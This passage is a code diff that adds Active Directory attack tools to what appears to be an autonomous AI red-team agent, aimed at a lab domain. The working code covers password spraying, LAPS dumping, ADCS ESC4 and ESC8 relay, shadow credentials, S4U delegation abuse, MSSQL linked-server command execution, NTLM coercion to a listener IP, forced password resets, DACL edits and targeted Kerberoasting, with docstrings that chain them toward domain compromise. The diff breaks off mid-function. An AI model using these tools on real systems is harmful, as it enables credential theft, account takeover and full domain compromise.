@@ -186,6 +186,281 @@ class NetworkEnumerationTools(Toolset):
             return f"Share enumeration failed for {target}: {e}"
 
 
+class CredentialDiscoveryTools(Toolset):
+    """Tools for discovering credentials through low-hanging fruit attacks.
+
+    These tools find easy wins that should be run FIRST before complex attacks:
+    - Passwords in LDAP description fields
+    - Username=password combinations
+    - Password spraying with common passwords
+    """
+
+    state: RedTeamState | None = None
+
+    def set_state(self, state: RedTeamState) -> None:
+        """Set the operation state for this toolset."""
+        self.state = state
+
+    @dn.tool_method
+    def ldap_search_descriptions(
+        self,
+        target: str,
+        domain: str,
+        username: str,
+        password: str,
+    ) -> str:
+        """
+        Search for passwords stored in user description fields (LOW HANGING FRUIT).
+
+        Many environments have passwords stored in the description attribute of user
+        accounts. This is a common misconfiguration that provides immediate access.
+
+        **RUN THIS EARLY** - It's fast and often yields credentials like samwell.tarly:Heartsbane.
+
+        Args:
+            target: Domain controller IP address
+            domain: Target domain (e.g., 'sevenkingdoms.local')
+            username: Username for LDAP authentication
+            password: Password for authentication
+
+        Returns:
+            Users with non-empty descriptions (check for passwords!)
+
+        Example:
+            >>> ldap_search_descriptions("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+        """
+        # Convert domain to base DN
+        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])
+
+        # Search for users with descriptions that might contain passwords
+        cmd = [
+            "ldapsearch",
+            "-x",
+            "-H",
+            f"ldap://{target}",
+            "-D",
+            f"{username}@{domain}",
+            "-w",
+            password,
+            "-b",
+            base_dn,
+            "(&(objectClass=user)(description=*))",
+            "sAMAccountName",
+            "description",
+            "userPrincipalName",
+        ]
+
+        try:
+            logger.info(f"[*] Searching LDAP descriptions for passwords in {domain}")
+            stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Highlight potential passwords
+            if "description:" in result.lower():
+                logger.warning("[!] Found users with descriptions - CHECK FOR PASSWORDS!")
+                result = (
+                    "🚨 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
+                    "→ Common pattern: user 'samwell.tarly' has password 'Heartsbane' in description\n"
+                    "→ Test any found credentials immediately with domain_admin_checker\n\n"
+                    + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"LDAP search failed: {e}"
+
+    @dn.tool_method
+    def password_spray(
+        self,
+        target: str,
+        domain: str,
+        users_file: str,
+        password: str,
+        delay_seconds: int = 0,
+    ) -> str:
+        """
+        Test a single password against all domain users (password spraying).
+
+        Password spraying tests one password against many users to avoid lockouts.
+        Common passwords to try: 'Password1', 'Welcome1', 'Company123', season+year.
+
+        **CRITICAL**: Check lockout policy first. Default is usually 5 attempts.
+
+        Args:
+            target: Domain controller IP address
+            domain: Target domain
+            users_file: Path to file containing usernames (one per line)
+            password: Password to spray
+            delay_seconds: Delay between attempts (default: 0)
+
+        Returns:
+            Successful authentications (look for valid credentials)
+
+        Example:
+            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt", "Password1")
+        """
+        cmd = [
+            "netexec",
+            "smb",
+            target,
+            "-u",
+            users_file,
+            "-p",
+            password,
+            "-d",
+            domain,
+            "--continue-on-success",
+        ]
+
+        if delay_seconds > 0:
+            cmd.extend(["--jitter", str(delay_seconds)])
+
+        try:
+            logger.info(f"[*] Password spraying {domain} with password: {password}")
+            stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for successful authentications
+            if "[+]" in result or "Pwn3d!" in result:
+                logger.warning("[!] PASSWORD SPRAY FOUND VALID CREDENTIALS!")
+                result = (
+                    "🚨 VALID CREDENTIALS FOUND!\n"
+                    "→ Look for [+] lines indicating successful auth\n"
+                    "→ 'Pwn3d!' indicates ADMIN access\n"
+                    "→ Use found credentials for further enumeration\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Password spray failed: {e}"
+
+    @dn.tool_method
+    def username_as_password(
+        self,
+        target: str,
+        domain: str,
+        users_file: str,
+    ) -> str:
+        """
+        Test if any user has their username as their password (LOW HANGING FRUIT).
+
+        Many users set their password to match their username (e.g., hodor:hodor).
+        This is fast, safe (one attempt per user), and often successful.
+
+        **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.
+
+        Args:
+            target: Domain controller IP address
+            domain: Target domain
+            users_file: Path to file containing usernames (one per line)
+
+        Returns:
+            Users with username=password combinations
+
+        Example:
+            >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt")
+        """
+        # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
+        cmd = [
+            "netexec",
+            "smb",
+            target,
+            "-u",
+            users_file,
+            "-p",
+            users_file,
+            "-d",
+            domain,
+            "--no-bruteforce",
+            "--continue-on-success",
+        ]
+
+        try:
+            logger.info(f"[*] Testing username=password combinations in {domain}")
+            stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for successful authentications
+            if "[+]" in result:
+                logger.warning("[!] FOUND USER WITH USERNAME=PASSWORD!")
+                result = (
+                    "🚨 USERNAME=PASSWORD FOUND!\n"
+                    "→ Common examples: hodor:hodor, guest:guest\n"
+                    "→ Use found credentials for kerberoast, asrep_roast, bloodhound\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Username-as-password test failed: {e}"
+
+    @dn.tool_method
+    def laps_dump(
+        self,
+        target: str,
+        domain: str,
+        username: str,
+        password: str,
+    ) -> str:
+        """
+        Dump LAPS (Local Administrator Password Solution) passwords.
+
+        LAPS stores randomized local admin passwords in AD. If you have read access
+        to the ms-Mcs-AdmPwd attribute, you can retrieve local admin passwords.
+
+        Use when you have elevated permissions or after ACL abuse grants read access.
+
+        Args:
+            target: Domain controller IP address
+            domain: Target domain
+            username: Username for authentication
+            password: Password for authentication
+
+        Returns:
+            LAPS passwords for computers where you have read access
+
+        Example:
+            >>> laps_dump("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+        """
+        cmd = [
+            "netexec",
+            "ldap",
+            target,
+            "-u",
+            username,
+            "-p",
+            password,
+            "-d",
+            domain,
+            "-M",
+            "laps",
+        ]
+
+        try:
+            logger.info(f"[*] Dumping LAPS passwords from {domain}")
+            stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "password" in result.lower() or "laps" in result.lower():
+                logger.info("[+] LAPS passwords retrieved!")
+                result = (
+                    "📋 LAPS PASSWORDS RETRIEVED\n"
+                    "→ These are local Administrator passwords for specific computers\n"
+                    "→ Use with evil_winrm or psexec against the target computer\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"LAPS dump failed: {e}"
+
+
 class CredentialHarvestingTools(Toolset):
     """Tools for harvesting credentials via Active Directory attacks."""
 
@@ -843,7 +1118,7 @@ class BloodHoundTools(Toolset):
         """Set the operation state for this toolset."""
         self.state = state
 
-    def _parse_bloodhound_output(self, raw_output: str) -> dict[str, Any]:
+    def _parse_bloodhound_output(self, raw_output: str) -> dict[str, Any]:  # noqa: PLR0912
         """Parse BloodHound collection output for actionable attack paths.
 
         Returns:
@@ -853,6 +1128,7 @@ class BloodHoundTools(Toolset):
             - acl_abuse_targets: Accounts vulnerable to ACL abuse
             - high_value_targets: High-value target accounts
             - recommended_actions: Specific next steps
+            - discovered_hosts: List of discovered computer hostnames
         """
         result: dict[str, Any] = {
             "attack_paths": [],
@@ -862,6 +1138,8 @@ class BloodHoundTools(Toolset):
             "recommended_actions": [],
             "collection_successful": False,
             "json_files_created": [],
+            "discovered_hosts": [],  # Computer hostnames from collection
+            "computers_found": 0,
             "raw_output": raw_output,
         }
 
@@ -928,6 +1206,34 @@ class BloodHoundTools(Toolset):
                     }
                 )
 
+        # Parse discovered computers/hosts
+        # BloodHound outputs: "INFO     Found X computers" or "Found X computers"
+        for line in raw_output.split("\n"):
+            # Match "Found X computers" patterns
+            computer_count_match = re.search(r"Found\s+(\d+)\s+computers?", line, re.IGNORECASE)
+            if computer_count_match:
+                result["computers_found"] = int(computer_count_match.group(1))
+
+            # Match connecting to host: "Connecting to host: HOSTNAME.domain"
+            host_connect_match = re.search(
+                r"Connecting\s+to\s+host:\s+([A-Za-z0-9\-\.]+)", line, re.IGNORECASE
+            )
+            if host_connect_match:
+                hostname = host_connect_match.group(1)
+                if hostname not in result["discovered_hosts"]:
+                    result["discovered_hosts"].append(hostname)
+
+            # Match domain references like "DC01.domain.local" or computer names in output
+            # Look for FQDN patterns that appear to be computer names
+            fqdn_matches = re.findall(r"\b([A-Za-z0-9\-]+\.[A-Za-z0-9\-\.]+\.local)\b", line)
+            for fqdn in fqdn_matches:
+                # Skip if it looks like a user principal name (contains @)
+                if "@" not in fqdn and fqdn not in result["discovered_hosts"]:
+                    # Check if it's a computer-like name (uppercase or ends with $)
+                    hostname_part = fqdn.split(".")[0]
+                    if hostname_part.isupper() or len(hostname_part) <= 15:
+                        result["discovered_hosts"].append(fqdn)
+
         # Standard recommendations for BloodHound output
         if result["collection_successful"]:
             # Always recommend analyzing for ADCS
@@ -952,7 +1258,7 @@ class BloodHoundTools(Toolset):
         return result
 
     @dn.tool_method
-    def run_bloodhound(
+    def run_bloodhound(  # noqa: PLR0912
         self,
         domain: str,
         username: str,
@@ -1009,6 +1315,30 @@ class BloodHoundTools(Toolset):
 
             # Parse output for actionable intelligence
             parsed = self._parse_bloodhound_output(raw_output)
+
+            # Register discovered hosts in state if available
+            if self.state and parsed.get("discovered_hosts"):
+                for hostname in parsed["discovered_hosts"]:
+                    # Extract short hostname from FQDN
+                    short_hostname = hostname.split(".")[0] if "." in hostname else hostname
+                    host = Host(
+                        ip="",  # IP not available from BloodHound output
+                        hostname=short_hostname,
+                        os="Windows",  # Assume Windows for AD computers
+                        roles=["DC"] if "DC" in short_hostname.upper() else [],
+                        services=[],
+                    )
+                    # Use add_host if available (SharedRedTeamState), else append
+                    if hasattr(self.state, "add_host"):
+                        self.state.add_host(host)
+                    # RedTeamState uses hosts list directly
+                    elif not any(h.hostname == short_hostname for h in self.state.hosts):
+                        self.state.hosts.append(host)
+                    logger.debug(f"Registered host from BloodHound: {short_hostname}")
+
+                logger.info(
+                    f"[+] Registered {len(parsed['discovered_hosts'])} hosts from BloodHound collection"
+                )
 
             logger.info("[+] BloodHound collection completed")
 
@@ -1402,6 +1732,215 @@ class CertipyTools(Toolset):
         except Exception as e:
             return f"Certificate authentication failed: {e}"
 
+    @dn.tool_method
+    def certipy_template_esc4(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        template_name: str,
+        dc_ip: str,
+        action: str = "modify",
+    ) -> str:
+        """
+        Exploit ESC4 by modifying a vulnerable certificate template (GenericWrite abuse).
+
+        ESC4 occurs when you have GenericWrite/GenericAll on a certificate template.
+        Modify the template to enable ESC1 (Enrollee Supplies Subject), then request
+        a certificate as Administrator.
+
+        Attack chain: certipy_template_esc4 (modify) → certipy_req_esc1 → certipy_auth
+
+        Args:
+            domain: Target domain
+            username: Username with GenericWrite on template
+            password: Password for authentication
+            template_name: Vulnerable template name
+            dc_ip: Domain controller IP
+            action: 'modify' to enable ESC1, 'restore' to revert changes
+
+        Returns:
+            Template modification result
+
+        Example:
+            >>> certipy_template_esc4("domain.local", "user", "pass", "VulnTemplate", "192.168.56.10")
+        """
+        if action == "modify":
+            cmd = [
+                "certipy",
+                "template",
+                "-u",
+                f"{username}@{domain}",
+                "-p",
+                password,
+                "-dc-ip",
+                dc_ip,
+                "-template",
+                template_name,
+                "-save-old",
+            ]
+        else:  # restore
+            cmd = [
+                "certipy",
+                "template",
+                "-u",
+                f"{username}@{domain}",
+                "-p",
+                password,
+                "-dc-ip",
+                dc_ip,
+                "-template",
+                template_name,
+                "-configuration",
+                f"{template_name}.json",
+            ]
+
+        try:
+            logger.info(f"[*] ESC4: {action}ing template {template_name}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if action == "modify" and ("saved" in result.lower() or "modified" in result.lower()):
+                logger.info("[+] Template modified for ESC1! Run certipy_req_esc1 next.")
+                result = (
+                    "🚨 ESC4 EXPLOITATION - TEMPLATE MODIFIED!\n"
+                    "→ Template now allows Enrollee Supplies Subject (ESC1)\n"
+                    f"→ Run certipy_req_esc1 with template '{template_name}'\n"
+                    "→ Remember to restore template after exploitation\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"ESC4 template modification failed: {e}"
+
+    @dn.tool_method
+    def certipy_relay_esc8(
+        self,
+        ca_host: str,
+        template_name: str = "DomainController",
+        target_upn: str | None = None,
+    ) -> str:
+        """
+        Set up ESC8 relay listener for ADCS web enrollment attack.
+
+        ESC8 relays NTLM authentication to the ADCS HTTP enrollment endpoint.
+        Use with PetitPotam or Coercer to coerce DC authentication.
+
+        Attack chain:
+        1. Start certipy_relay_esc8 listener
+        2. Run petitpotam to coerce DC auth to your listener
+        3. Relay obtains DC certificate
+        4. Use certipy_auth with DC cert
+
+        Args:
+            ca_host: Certificate Authority hostname or IP
+            template_name: Template to request (default: DomainController)
+            target_upn: Optional UPN to request certificate for
+
+        Returns:
+            Relay listener status (run in background, then coerce auth)
+
+        Example:
+            >>> certipy_relay_esc8("ca.domain.local", "DomainController")
+            # Then in another session: petitpotam("dc_ip", "your_listener_ip")
+        """
+        cmd = [
+            "certipy",
+            "relay",
+            "-ca",
+            ca_host,
+            "-template",
+            template_name,
+        ]
+
+        if target_upn:
+            cmd.extend(["-upn", target_upn])
+
+        try:
+            logger.info(f"[*] Starting ESC8 relay listener targeting {ca_host}")
+            # This runs as a listener - timeout after short period for testing
+            # In real use, this would run in background
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=30)
+
+            result = stdout + "\n" + (stderr or "")
+
+            return (
+                "📋 ESC8 RELAY SETUP\n"
+                "→ Relay listener configured for ADCS web enrollment\n"
+                "→ Use petitpotam or coercer to force DC authentication\n"
+                "→ Relayed auth will request DC certificate\n"
+                f"→ Target CA: {ca_host}\n\n" + result
+            )
+
+        except Exception as e:
+            return f"ESC8 relay setup failed: {e}"
+
+    @dn.tool_method
+    def certipy_shadow_auto(
+        self,
+        domain: str,
+        username: str,
+        password: str,
+        target: str,
+        dc_ip: str,
+    ) -> str:
+        """
+        Auto-exploit shadow credentials to obtain target's NTLM hash (certipy shadow).
+
+        Combines shadow credential addition with PKINIT authentication in one step.
+        Use when you have GenericAll/GenericWrite on a user or computer.
+
+        This is often more reliable than pywhisker + manual certipy auth.
+
+        Args:
+            domain: Target domain
+            username: Your username with GenericAll/GenericWrite
+            password: Your password
+            target: Target account to compromise (sAMAccountName)
+            dc_ip: Domain controller IP
+
+        Returns:
+            Target's NTLM hash
+
+        Example:
+            >>> certipy_shadow_auto("domain.local", "attacker", "pass", "victim_user", "192.168.56.10")
+        """
+        cmd = [
+            "certipy",
+            "shadow",
+            "auto",
+            "-u",
+            f"{username}@{domain}",
+            "-p",
+            password,
+            "-dc-ip",
+            dc_ip,
+            "-account",
+            target,
+        ]
+
+        try:
+            logger.info(f"[*] Auto shadow credentials attack on {target}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "hash" in result.lower() or "ntlm" in result.lower():
+                logger.info(f"[+] Shadow credentials attack successful on {target}!")
+                result = (
+                    f"🚨 SHADOW CREDENTIALS SUCCESS - {target} COMPROMISED!\n"
+                    "→ NTLM hash obtained via PKINIT\n"
+                    "→ Use domain_admin_checker with the hash\n"
+                    "→ Key credentials automatically cleaned up\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Shadow credentials attack failed: {e}"
+
 
 class DelegationTools(Toolset):
     """Tools for Kerberos delegation attacks (RBCD, unconstrained, constrained)."""
@@ -1602,6 +2141,145 @@ class DelegationTools(Toolset):
             return stdout or stderr
         except Exception as e:
             return f"Service ticket request failed: {e}"
+
+    @dn.tool_method
+    def constrained_delegation_s4u(
+        self,
+        domain: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        target_spn: str = "",
+        impersonate_user: str = "Administrator",
+        dc_ip: str = "",
+        alt_service: str | None = None,
+    ) -> str:
+        """
+        Exploit constrained delegation via S4U2Self + S4U2Proxy (TRUSTED_TO_AUTH_FOR_DELEGATION).
+
+        When an account has constrained delegation configured (msDS-AllowedToDelegateTo),
+        you can impersonate any user to the allowed services.
+
+        Use find_delegation first to identify accounts with constrained delegation.
+
+        Args:
+            domain: Target domain
+            username: Account with constrained delegation (can be user or computer with $)
+            password: Password for the account (optional if using hash)
+            hash: NTLM hash for the account (optional if using password)
+            target_spn: Allowed SPN from msDS-AllowedToDelegateTo
+            impersonate_user: User to impersonate (default: Administrator)
+            dc_ip: Domain controller IP
+            alt_service: Alternative service to request (SPN modification attack)
+
+        Returns:
+            Service ticket for impersonated user
+
+        Example:
+            >>> constrained_delegation_s4u("domain.local", "svc_sql", password="pass", target_spn="MSSQLSvc/db.domain.local", impersonate_user="Administrator", dc_ip="192.168.56.10")  # pragma: allowlist secret
+            >>> constrained_delegation_s4u("domain.local", "svc_sql", password="pass", target_spn="MSSQLSvc/db.domain.local", alt_service="cifs/db.domain.local", dc_ip="192.168.56.10")  # pragma: allowlist secret
+        """
+        if not password and not hash:
+            return "[!] Error: Either password or hash must be provided"
+
+        target_string = f"{domain}/{username}:{password}" if password else f"{domain}/{username}"
+
+        cmd = [
+            "impacket-getST",
+            "-spn",
+            target_spn,
+            "-impersonate",
+            impersonate_user,
+            "-dc-ip",
+            dc_ip,
+        ]
+
+        if hash:
+            cmd.extend(["-hashes", f":{hash}"])
+
+        if alt_service:
+            cmd.extend(["-altservice", alt_service])
+
+        cmd.append(target_string)
+
+        try:
+            logger.info(f"[*] S4U attack: {username} → {impersonate_user} @ {target_spn}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if ".ccache" in result:
+                logger.info("[+] S4U attack successful! Ticket obtained.")
+                result = (
+                    f"🚨 CONSTRAINED DELEGATION EXPLOITED!\n"
+                    f"→ Impersonating {impersonate_user} to {alt_service or target_spn}\n"
+                    "→ Export KRB5CCNAME=<ccache_file>\n"
+                    "→ Use secretsdump -k -no-pass for DCSync\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"S4U attack failed: {e}"
+
+    @dn.tool_method
+    def get_tgt(
+        self,
+        domain: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        dc_ip: str = "",
+    ) -> str:
+        """
+        Request TGT for a user (overpass-the-hash / pass-the-key).
+
+        Convert NTLM hash or password to a Kerberos TGT for use with
+        Kerberos-only tools (secretsdump -k, smbclient.py -k, etc.).
+
+        Args:
+            domain: Target domain
+            username: Username to get TGT for
+            password: Password (optional if using hash)
+            hash: NTLM hash (optional if using password)
+            dc_ip: Domain controller IP
+
+        Returns:
+            TGT saved as .ccache file
+
+        Example:
+            >>> get_tgt("domain.local", "administrator", hash="aad3b435...", dc_ip="192.168.56.10")
+        """
+        if not password and not hash:
+            return "[!] Error: Either password or hash must be provided"
+
+        target_string = f"{domain}/{username}:{password}" if password else f"{domain}/{username}"
+
+        cmd = ["impacket-getTGT", "-dc-ip", dc_ip]
+
+        if hash:
+            cmd.extend(["-hashes", f":{hash}"])
+
+        cmd.append(target_string)
+
+        try:
+            logger.info(f"[*] Requesting TGT for {username}@{domain}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if ".ccache" in result:
+                logger.info("[+] TGT obtained!")
+                result = (
+                    f"✅ TGT OBTAINED FOR {username}@{domain}\n"
+                    "→ Export KRB5CCNAME=<username>.ccache\n"
+                    "→ Use with -k -no-pass flags for Kerberos auth\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"TGT request failed: {e}"
 
 
 class RedTeamReportingTools(Toolset):
@@ -2093,6 +2771,192 @@ class MSSQLTools(Toolset):
         except Exception as e:
             return f"xp_cmdshell failed: {e}"
 
+    @dn.tool_method
+    def mssql_enum_linked_servers(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Enumerate MSSQL linked servers for cross-server pivoting.
+
+        Linked servers enable SQL queries across database instances and can be
+        chained for privilege escalation across servers, domains, and forests.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            domain: Domain for Windows auth
+            windows_auth: Use Windows authentication
+
+        Returns:
+            List of linked servers with access information
+
+        Example:
+            >>> mssql_enum_linked_servers("192.168.56.22", "user", "pass", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # Enumerate linked servers and check access
+        # nosec B608 - intentional SQL for MSSQL pentest enumeration
+        sql_query = """
+SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;
+EXEC sp_linkedservers;
+"""
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Enumerating linked servers on {target}")
+            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "linked" in result.lower() or "srv_name" in result.lower():
+                logger.info("[+] Linked servers found!")
+                result = (
+                    "📋 LINKED SERVERS FOUND\n"
+                    "→ Use mssql_exec_linked to execute queries on linked servers\n"
+                    "→ Chain across servers for cross-domain/forest pivoting\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Linked server enumeration failed: {e}"
+
+    @dn.tool_method
+    def mssql_exec_linked(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        linked_server: str,
+        query: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Execute query on a linked MSSQL server (cross-server pivoting).
+
+        Use after finding linked servers with mssql_enum_linked_servers.
+        Can enable xp_cmdshell on remote servers through the link chain.
+
+        Args:
+            target: Local MSSQL server IP (where you have access)
+            username: Username for local authentication
+            password: Password for authentication
+            linked_server: Name of the linked server to execute on
+            query: SQL query to execute (or 'xp_cmdshell ''command''')
+            domain: Domain for Windows auth
+            windows_auth: Use Windows authentication
+
+        Returns:
+            Query result from the linked server
+
+        Example:
+            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
+            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # Execute on linked server using OPENQUERY or AT syntax
+        # nosec B608 - intentional SQL for MSSQL pentest enumeration
+        sql_query = f"EXEC ('{query}') AT [{linked_server}];"
+
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Executing query on linked server {linked_server}")
+            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "system_user" in result.lower() or "nt authority" in result.lower():
+                logger.info(f"[+] Successful execution on {linked_server}!")
+                result = (
+                    f"🚨 LINKED SERVER EXECUTION SUCCESSFUL ON {linked_server}!\n"
+                    "→ Try enabling xp_cmdshell: sp_configure 'xp_cmdshell', 1\n"
+                    "→ Check for further linked servers to chain\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Linked server execution failed: {e}"
+
+    @dn.tool_method
+    def mssql_ntlm_coerce(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        listener_ip: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Coerce NTLM authentication from MSSQL server for relay attacks.
+
+        Forces the SQL Server machine account to authenticate to your listener.
+        Useful for relaying to LDAPS for RBCD or shadow credentials.
+
+        Args:
+            target: MSSQL server IP
+            username: Username for authentication
+            password: Password for authentication
+            listener_ip: Your listener IP (running Responder/ntlmrelayx)
+            domain: Domain for Windows auth
+            windows_auth: Use Windows authentication
+
+        Returns:
+            Coercion attempt result
+
+        Example:
+            >>> mssql_ntlm_coerce("192.168.56.22", "user", "pass", "192.168.56.100", "domain.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # Use xp_dirtree to coerce auth
+        # nosec B608 - intentional SQL for MSSQL pentest
+        sql_query = f"EXEC xp_dirtree '\\\\\\\\{listener_ip}\\\\share';"
+
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Coercing NTLM auth from {target} to {listener_ip}")
+            stdout, stderr, _ = _run_tool(["bash", "-c", cmd_string], timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            return (
+                f"📋 MSSQL NTLM COERCION ATTEMPTED\n"
+                f"→ SQL Server should attempt to authenticate to {listener_ip}\n"
+                "→ Check your Responder/ntlmrelayx for captured auth\n"
+                "→ Machine account hash can be relayed to LDAPS\n\n" + result
+            )
+
+        except Exception as e:
+            return f"MSSQL NTLM coercion failed: {e}"
+
 
 class ACLExploitTools(Toolset):
     """Tools for exploiting Active Directory ACL misconfigurations.
@@ -2298,6 +3162,201 @@ class ACLExploitTools(Toolset):
 
         except Exception as e:
             return f"bloodyAD failed: {e}"
+
+    @dn.tool_method
+    def force_change_password(
+        self,
+        target_user: str,
+        new_password: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+    ) -> str:
+        """
+        Force change a user's password via ForceChangePassword ACL (net rpc).
+
+        Alternative to bloodyad_set_password using rpcclient/net rpc.
+        Use when you have ForceChangePassword permission on a user.
+
+        **WARNING**: This is disruptive - the user's real password changes!
+
+        Args:
+            target_user: User whose password to reset
+            new_password: New password to set
+            domain: Target domain
+            username: Your username with ForceChangePassword permission
+            password: Your password
+            dc_ip: Domain controller IP
+
+        Returns:
+            Password change result
+
+        Example:
+            >>> force_change_password("victim_user", "NewP@ss123!", "domain.local", "attacker", "pass", "192.168.56.10")
+        """
+        # Use net rpc password for the change
+        cmd = [
+            "net",
+            "rpc",
+            "password",
+            target_user,
+            new_password,
+            "-U",
+            f"{domain}/{username}%{password}",
+            "-S",
+            dc_ip,
+        ]
+
+        try:
+            logger.info(f"[*] Force changing password for {target_user}")
+            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or "success" in result.lower():
+                logger.info(f"[+] Password for {target_user} changed successfully!")
+                result = (
+                    f"✅ Password changed for {target_user}!\n"
+                    f"→ New credential: {target_user}:{new_password}\n"
+                    f"→ Test with domain_admin_checker immediately\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"Force password change failed: {e}"
+
+    @dn.tool_method
+    def dacl_edit(
+        self,
+        target_dn: str,
+        principal: str,
+        rights: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+        action: str = "write",
+    ) -> str:
+        """
+        Modify DACL permissions on AD objects (dacledit.py).
+
+        Use when you have WriteDacl permission. Grant yourself additional rights
+        to enable further attacks (e.g., grant GenericAll to perform shadow creds).
+
+        Args:
+            target_dn: Distinguished name of target object
+            principal: User/group to grant rights to
+            rights: Rights to grant ('FullControl', 'GenericAll', 'GenericWrite', 'WriteMembers')
+            domain: Target domain
+            username: Your username with WriteDacl permission
+            password: Your password
+            dc_ip: Domain controller IP
+            action: 'write' to add, 'remove' to delete permissions
+
+        Returns:
+            DACL modification result
+
+        Example:
+            >>> dacl_edit("CN=Domain Admins,CN=Users,DC=domain,DC=local", "attacker", "GenericAll", "domain.local", "user", "pass", "192.168.56.10")
+        """
+        cmd = [
+            "dacledit.py",
+            "-action",
+            action,
+            "-rights",
+            rights,
+            "-principal",
+            principal,
+            "-target-dn",
+            target_dn,
+            f"{domain}/{username}:{password}",
+            "-dc-ip",
+            dc_ip,
+        ]
+
+        try:
+            logger.info(f"[*] Modifying DACL on {target_dn}: granting {rights} to {principal}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if "success" in result.lower() or "modified" in result.lower():
+                logger.info("[+] DACL modified successfully!")
+                result = (
+                    f"✅ DACL modified: {principal} now has {rights} on target!\n"
+                    "→ Use new permissions for further exploitation\n\n" + result
+                )
+
+            return result
+
+        except Exception as e:
+            return f"DACL edit failed: {e}"
+
+    @dn.tool_method
+    def targeted_kerberoast(
+        self,
+        target_user: str,
+        domain: str,
+        username: str,
+        password: str,
+        dc_ip: str,
+    ) -> str:
+        """
+        Perform targeted Kerberoasting by adding an SPN to a user (GenericWrite abuse).
+
+        When you have GenericWrite on a user, you can add an SPN and then Kerberoast them.
+        This allows cracking the password of any user you have GenericWrite on.
+
+        Attack chain: Add SPN → Request TGS → Crack offline → Remove SPN
+
+        Args:
+            target_user: User to add SPN to and Kerberoast
+            domain: Target domain
+            username: Your username with GenericWrite
+            password: Your password
+            dc_ip: Domain controller IP
+
+        Returns:
+            Kerberoast hash for the target user
+
+        Example:
+            >>> targeted_kerberoast("high_value_user", "domain.local", "attacker", "pass", "192.168.56.10")
+        """
+        # Use targetedKerberoast.py which handles the full attack chain
+        cmd = [
+            "targetedKerberoast.py",
